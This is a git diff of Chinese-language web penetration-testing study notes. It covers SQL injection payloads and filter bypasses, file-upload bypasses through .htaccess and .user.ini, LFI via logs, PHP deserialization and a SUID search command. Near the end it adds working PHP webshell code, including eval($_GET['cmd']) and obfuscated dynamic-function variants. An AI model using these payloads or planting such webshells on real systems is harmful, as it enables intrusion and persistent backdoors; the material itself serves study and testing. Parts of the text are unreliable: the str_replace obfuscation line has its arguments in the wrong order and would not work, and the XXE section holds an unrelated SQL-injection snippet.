@@ -40,6 +40,7 @@
 - 测绘工具：搜索`domain=target.com`
 - 搜索引擎：`site:target.com -site:www.target.com`
 - 信息查询工具：[子域名查询](https://tool.chinaz.com/subdomain/)
+- 爆破
 
 ### IP地址
 
@@ -49,7 +50,7 @@
 
 若网站有多个IP地址，网站很可能使用了CDN（Content Distribution Network）、反向代理等，需要绕过CDN节点**寻找真实IP地址**
 
-- **利用子域名**：主站和分站经常在相同IP或同一C段，若分站没开CDN就能从分站找到主站
+- **相关域名**：相关站点经常在相同IP或同一C段，可尝试寻找子域名、父域名地址，若它们没开CDN就能从此地址找到主站
 - **邮件服务**：网站发出邮件不可用CDN，可从该站点发出的邮件源码分析（比如验证邮件、RSS邮件订阅）
 - **国外地址请求**：一般不会为海外地址部署CDN，从国外访问到的可能是真实地址。最暴力的可以从全球访问，其中必定有服务器真实地址
 - **搜索特征文件**：部分文件不会缓存在CDN上，可以在网络测绘工具搜索这样的文件
@@ -129,6 +130,7 @@ UPDATE users SET name='user' WHERE id='' and (SELECT substring(pwd,1,1))='a';  #
 ```
 
 4. **获取数据**
+   - 判断数据库类别：https://websec.readthedocs.io/zh/latest/vuln/sql/dbident.html
    - 数据库管理系统信息：版本`version()`，用户名`user()`，数据库名`database()`，操作系统`@@version_compile_os`
    - 数据库结构：MySQL等数据库将结构信息存在`information_schema`数据库中，可跨库查询（一般需要较高权限）
 
@@ -167,7 +169,7 @@ regexp, rlike, trim, insert, like;
 
 #### 延时盲注
 
-若完全没有回显，可以利用延时判断条件真假，若查询成功则会延迟一段时间再响应
+若完全没有回显，可以利用延时判断条件真假，若查询成功则会延迟一段时间再响应（注意：sleep函数找到多少条结果就会延迟多少次，比如`sleep(0.1)`搜索到20条结果就会延迟$0.1 \times 20 = 2$秒，可以用这个方法判断表的行数
 
 ```sql
 SELECT name FROM users WHERE id='' UNION SELECT IF((1=1), sleep(5), 0);
@@ -175,11 +177,12 @@ SELECT name FROM users WHERE id='' UNION SELECT CASE WHEN (1=1) THEN sleep(5) EL
 SELECT name FROM users WHERE id='' UNION SELECT sleep(5*(1=1));
 ```
 
-网站可能禁`IF`等关键字，按需灵活选取。`sleep`也有以下替代方法：
+网站可能禁`IF`等关键字，按需灵活选取。`sleep`也有以下替代方法（**以下方法都要注意不要引起DOS**）：
 
 ```sql
 SELECT benchmark(1000000, sha1('a'));    # 重复执行sha实现延时
-select rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');  # 正则状态机复杂匹配
+SELECT count(*) FROM users A, users B;   # 笛卡尔积延时
+SELECT rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');  # 正则状态机复杂匹配
 ```
 
 #### 报错盲注
@@ -237,7 +240,7 @@ UPDATE users SET pwd='pswd' WHERE name='admin' --
 
 ### 防护
 
-- **预编译**、**参数化查询**：将语句和数据分离
+- **预编译**、**参数化查询**：将语句和数据分离。一般是安全的，但表名、列名不能被占位符替代，如果允许拼接可能也有问题
 - **过滤**
   - **`addslashes`**：PHP的`addslashes`函数将单引号、双引号、反斜杠、NULL转义为`\', \", \\, \0`。有的服务器会配置**魔术引号**（Magic Quotes），自动将外部来源（HTTP参数、读取文件、读数据库）的文本用反斜杠转义。本意并不是防SQL注入的，只是恰好起到了一点效果
   - **`mysql_real_escape_string`**：`addslashes`的上位替换。但是安全性也没有高很多
@@ -267,7 +270,13 @@ SELECT * FROM users WHERE id=-1||name=0x61646d696e;
 SELECT * FROM users WHERE id=-1||least(substr(database(),1,1),'a')like'a';
 -- 闭合引号、括号绕过注释
 SELECT * FROM users WHERE id=('0')union(select'a',database(),'b') LIMIT 0,1;
+-- Join查询绕过逗号
+SELECT id, name FROM users WHERE id="0"union select * from ((select 1)A join (select 2)B);
+-- from for绕过逗号（只对substr和mid有用）
+SELECT * from users WHERE id=-1 || substr(database() from 1 for 1)='a';
 ```
+
+小技巧参考：https://websec.readthedocs.io/zh/latest/vuln/sql/ref.html#tricks
 
 ## 文件上传
 
@@ -275,11 +284,12 @@ SELECT * FROM users WHERE id=('0')union(select'a',database(),'b') LIMIT 0,1;
 
 ### 防护
 
-- **简单校验**：利用HTML表单、javascript、MIME类型校验
+- **文件校验**：检验文件合法性
+  - **简单校验**：利用HTML表单、javascript、MIME类型校验
 
-- **文件名校验**：检测扩展名并进行黑名单 / 白名单过滤。更严格一点的会把文件名也给改了，比如改成`时间戳.jpg`
+  - **文件名校验**：检测扩展名并进行黑名单 / 白名单过滤。更严格一点的会把文件名也给改了，比如改成`时间戳.jpg`
 
-- **文件头Magic Number**：读取文件前几个字节判断文件格式，如JPEG文件应以`FF D8 FF`开头，PNG为`89 50 4E 47`，GIF为`GIF89a`
+  - **文件头Magic Number**：读取文件前几个字节判断文件格式，如JPEG文件应以`FF D8 FF`开头，PNG为`89 50 4E 47`，GIF为`GIF89a`
 
 - **存储隔离**：放在静态资源目录，禁止解析
 
@@ -287,29 +297,23 @@ SELECT * FROM users WHERE id=('0')union(select'a',database(),'b') LIMIT 0,1;
 
 ### 绕过
 
-绕过黑名单，或者利用解析漏洞
+#### 文件校验绕过
 
-1. **冷门后缀**：php可能解析`php5` / `pht` / `phtml` / `shtml` / `pwml`；jsp可能解析`jspf` / `jspa` / `jsw` / `jsv` / `jtml` 等后缀；asp支持 `asa` / `asax` / `cer` / `cdx` / `aspx` / `ascx` / `ashx` / `asmx` / `asp{80-90}` 等后缀；`vbs, sh, reg, com, cgi, exe, cfc, cfm`等后缀也可能可以利用。较新版本基本不可能成功
+1. **冷门后缀**：php可能解析`php5` / `pht` / `phtml` / `shtml` / `pwml`；jsp可能解析`jspf` / `jspa` / `jsw` / `jsv` / `jtml` 等后缀；asp支持 `asa` / `asax` / `cer` / `cdx` / `aspx` / `ascx` / `ashx` / `asmx` / `asp{80-90}` 等后缀；`vbs, sh, reg, com, cgi, exe, cfc, cfm`等后缀也可能可以利用。较新版本的服务器基本不可能成功
 2. **系统命名绕过**：Windows系统可尝试`shell.php.`（末尾句点）、`shell.php%20`（末尾空格）、`shell.php:1.jpg`（冒号）、`shell.php::$DATA`（文件流）；Linux系统可尝试`index.php/.`、`./aa/../index.php/.`
-3. PHP服务器**`.user.ini`文件**：构造配置文件`auto_prepend_file=01.gif`，访问同一目录的php脚本时自动运行该文件。要求php 5.3以上
-4. apache服务器**`.htaccess`文件**：服务器配置必须开启`AllowOverride`
+3. **`.user.ini`文件**：适用于PHP 5.3以上，需要服务器处于CGI / Fast CGI模式，且上传目录下有PHP脚本，比如index.php。构造配置文件`auto_prepend_file=01.gif`，访问同一目录的php脚本时自动运行`01.gif`
+4. **`.htaccess`文件**：适用于apache服务器，需要服务器配置`AllowOverride`（也有说法称需要开启`rewrite`模块、需要Thread Safe版本PHP）
 
 ```htaccess
-<ifModule mime_module>
-    AddHandler php5-script .jpg
-    AddType application/x-httpd-php .jpg
+# 将所有文件名包含pwn的文件作为php解析
+<FilesMatch "pwn">
     Sethandler application/x-httpd-php
-</ifModule>
-
-<FilesMatch "muma.jpg">
-    Sethandler application/x-httpd-php
-    Addhandler php5-script .jpg
 </FilesMatch>
 ```
 
-使用图片木马 + 文件包含漏洞
+#### 图片木马
 
-包含恶意代码的图片俗称图片马。恶意代码插入于图片文件结束标记之后，或EXIF元数据，不影响图片显示；但将图片马作为代码执行时，解释器解析执行`<?php ?>`或`<% %>`中的代码。和图种的原理类似
+包含恶意代码的图片俗称图片马。恶意代码插入于图片文件结束标记之后，或EXIF元数据，不影响图片显示；但将图片马作为代码执行时，比如用文件包含漏洞，解释器解析执行`<?php ?>`或`<% %>`中的代码。和图种的原理类似
 
 1. 随便准备一张图片`a.jpg`
 2. 构造恶意代码。通常用“一句话木马”，即非常简短的木马，其隐蔽性较好。后续可用它作为跳板上传大木马
@@ -356,7 +360,7 @@ XSS只能影响到用户前端，无法直接作用于服务器
 
 ### 绕过
 
-安全的转义方式（如`htmlspecialchars`）是没有办法绕过的，除非网页结构特殊（如允许用户操作`a[href]`，或者包含了一个具有XSS漏洞的网页。这两种情况可以不定义新HTML标签、不更改给现有标签的属性而实现XSS）。不过，用户输入和回显形式多样，开发者可能会误以为某些输入是安全的所以不转义，或者干脆忘记转义。渗透测试就是要寻找这些不起眼的用户输入和显示，比如HTTP头也是一种用户输入；比如有的网站会将数据放在`input[type=hidden]`等隐藏元素
+安全的转义方式（如`htmlspecialchars`）是没有办法绕过的，除非网页结构特殊（如允许用户操作`a[href]`，或者包含了一个具有XSS漏洞的网页。这两种情况可以不定义新HTML标签、不更改给现有标签的属性而实现XSS）。不过，用户输入和回显形式多样，开发者可能会误以为某些输入是安全的所以不转义，或者干脆忘记转义。渗透测试就是要寻找这些不起眼的用户输入和显示，比如HTTP头、`input[type=hidden]`等隐藏元素
 
 首先试着注入单引号、双引号、HTML标签、URI转义、HTML实体，如`1'2"<b>&#x61;&#x3a;%41</b>`如果都被转义就可以找下一个目标了
 
@@ -376,30 +380,36 @@ XSS只能影响到用户前端，无法直接作用于服务器
 
 ## 服务器端请求伪造（SSRF）
 
-服务器端请求伪造（Server-Side Request Forgery，SSRF）是攻击者通过操纵服务器发出请求获取敏感信息
+服务器端请求伪造（Server-Side Request Forgery，SSRF）是攻击者通过操纵服务器发出请求获取敏感信息，常用于内网横向
 
 ## 远程代码执行（RCE）
 
 远程代码执行（Remote Code Execution，RCE），也叫任意代码执行（Artibrary Code Execution，ACE）。网站使用`eval`等函数时，若用户可控制参数，则可以执行任意代码
 
+过滤绕过：https://wiki.wgpsec.org/knowledge/ctf/exec.html
+
+使用其他漏洞也有可能实现任意代码执行，比如用文件上传漏洞传一个WebShell，自然什么代码都能执行了。但这种间接实现RCE的通常不叫作RCE漏洞
+
 ## 文件包含
 
-开发者常通过函数（如PHP的`include`、`require`）将其他文件的内容引入当前脚本，例如加载配置文件、复用代码模块。当**用户输入用于文件路径**且未做严格过滤时，攻击者可以篡改路径，包含非预期的文件（如系统文件、远程脚本）。
+开发者常通过函数（如PHP的`include`、`require`）将其他文件的内容引入当前脚本，例如加载配置文件、复用代码模块。当**用户输入用于文件路径**且未做严格过滤时，攻击者可以篡改路径，包含非预期的文件（如系统文件、远程脚本）
 
 - **本地文件包含**（Local File Inclusion，LFI）：包含服务器本地文件，可用于窃取敏感信息，或配合文件上传漏洞执行任意代码
-- **远程文件包含**（Remote File Inclusion，RFI）：包含远程服务器文件（一般需要服务器开启配置），直接执行恶意代码
+- **远程文件包含**（Remote File Inclusion，RFI）：包含远程服务器文件（需要服务器开启`allow_url_include`配置），直接执行恶意代码
 
-## 文件下载
+**LFI利用方式**
 
-
+- 文件上传漏洞
+- PHP封装协议
+- 日志文件：如果服务器日志保存UA等信息，甚至可以将webshell注入到日志，再包含日志文件
+- 临时文件
+  - POST方法上传`multipart/form-data`，PHP会将文件存为临时文件，位于`php.ini`指定的`upload_tmp_dir`，默认为`/tmp`，文件名是`php + 4或6位随机字母/数字`，如`/tmp/phpY1WgtV`（可以在phpinfo的PHP Variables部分看到），php脚本运行结束后删除
+  - 在一次请求上传并利用临时文件：需要能够猜到临时文件名，比如使用通配符调用文件。CTF中有可能，实际业务中没有可行性
+  - 让PHP崩溃阻止删除临时文件：难度较大，取决于PHP版本
 
 ## 逻辑漏洞
 
 逻辑漏洞是业务逻辑设计缺陷导致的漏洞。此类漏洞一般不会直接引起安全问题，但往往可以成为攻击切入口
-
-### 支付漏洞
-
-绕过业务逻辑，如修改优惠券金额
 
 ### 越权访问
 
@@ -409,18 +419,132 @@ XSS只能影响到用户前端，无法直接作用于服务器
 
 绕过其他业务逻辑实现本来不允许的操作也可以叫做广义的逻辑越权，比如通过修改UA访问移动端页面（虽然这种操作不算漏洞，一般也没有危害性），或者
 
+### 业务漏洞
+
+绕过业务逻辑，如修改优惠券金额、预测验证码、覆盖注册等
+
 ### 敏感信息泄露
 
-
+包括但不限于：用户名、口令、个人数据（如姓名，住址，电话等）。代码、配置、日志、备份中都可能包含敏感信息
 
 ## 反序列化
 
+序列化和反序列化就是将对象转换为文本，以及将文本转换回对象的功能，它常用于对象的保存和传输。若Web应用未执行严格过滤，可以构造恶意数据，在反序列化过程中执行危险操作
+
+解析认证token、Session，传输json和XML、使用RMI协议时都可能有反序列化漏洞
+
+### PHP
+
+#### 简介
+
+PHP的`serialize`函数将对象转换为字符串，其中包括了对象的类名、属性名和属性值；`unserialize`函数将字符串转换回对象
+
+```php
+class Connection {
+    # 属性
+    protected $db;
+    private $user, $pass;
+    # 方法
+    private function connect(){
+        $this->db = new PDO('mysql:host=localhost;dbname=test', $this->user, $this->pass);
+    }
+    # 魔术方法
+    public function __construct($user, $pass){
+        $this->user = $user;
+        $this->pass = $pass;
+    }
+    public function __sleep(){
+        return array('user', 'pass');
+    }
+    public function __wakeup(){
+        // this->connect();
+        echo "wakeup\n";
+    }
+    public function __destruct(){
+        $this->db = null;
+    }
+}
+
+$conn = new Connection("John Doe", "p@ssword");
+echo serialize($conn);
+'O:10:"Connection":2:{s:16:"Connectionuser";s:8:"John Doe";s:16:"Connectionpass";s:8:"p@ssword";}'
+```
+
+序列化字符串中，
+
+- `O`：表示这是一个对象（数组则是A）
+- `10:"Connection"`：类名长度为10，值为`Connection`
+- `2`：有2个属性
+- `s:16:"Connectionuser"`：第一个属性名，它是字符串（`s`），长度为16，名为`Connectionuser`（private属性名会加上一些别的东西，8.2版本是类名，其他版本也有加空字节的）
+- `s:8:"John Doe"`：第一个属性值。含义同上
+
+`__wakeup`，`__destruct`都是与反序列化漏洞强相关的魔术方法，反序列化必定调用它们；其他魔术方法也可能被调用。假如`__wakeup`中有危险代码，或服务器用反序列化得到的对象进行危险操作，控制序列化字符串就能进行攻击了。不过，开发者不太可能犯这么大的错，一般需要用后面几节的技术
+
+#### POP链
+
+面向属性编程链（Property-Oriented Programming Chain，也叫Gadget Chain）
+
+#### phar文件
+
+phar文件是PHP代码和资源的压缩包，其中以序列化形式存储了phar元数据。PHP以`phar://`封装协议访问phar文件时会反序列元数据。结合文件上传漏洞 + 可以控制文件名的文件操作（例如`example.com/download?file=phar://phar.gif`）就能利用反序列化攻击
+
 ## XXE
 
-# 技巧
+```python
+payload = f"hex(hex(substr((select flag from flag) from {i} for 1))),/"
+print(f"[] Testing position {i}, payload: {payload}")
+```
+
+# 操作系统漏洞
+
+[GTFOBins](https://gtfobins.github.io/)收录了许多用Linux指令绕过操作系统安全策略的方法
+
+## SUID
+
+SUID是“set uid ID upon execution”的缩写。用户运行具有SUID的程序时，会暂时获得文件所属用户的权限，比如更改密码的程序`/usr/bin/passwd`拥有者是root，且具有SUID，普通用户运行此程序时可以暂时获得root权限，修改密码文件`/etc/shadow`，但用正常方法就无法篡改`/etc/shadow`
+
+```bash
+sudo -l  # 查看当前用户能sudo的指令
+find / -perm -u=s -user root -type f 2>/dev/null  # 查找SUID指令
+```
+
+能用SUID提权的指令有：wget
+
+# 其他
 
 ## 转义
 
 URI、HTML、SQL
 
 php: `htmlspecialchars`；mysqli：`mysqli_real_escape_string`
+
+## webshell
+
+### php
+
+```php
+# 基础webshell
+eval($_GET['cmd']);
+
+# 用字符串操作隐藏危险函数assert。其他类似方式：preg_replace, str_rot13
+$a = str_replace('ass*e**rt', '*', '');
+$a($_GET['kqbnjf']);
+
+# 用php特性做字符串操作，隐藏危险函数
+echo ~('和'[2]);     # 打印s。和的utf-8编码第三个字节是0x8c，取反得到0x73，正是s的编码
+$x = gettype([])[0]; # gettype([]) = 'array'，因此给$x赋值为'a'
+echo ++$x;           # 打印b。
+
+# 动态传入危险函数
+$a = $_GET['xymhwv'];
+$a($_GET['ehnzmq']);
+```
+
+
+
+
+
+
+
+
+
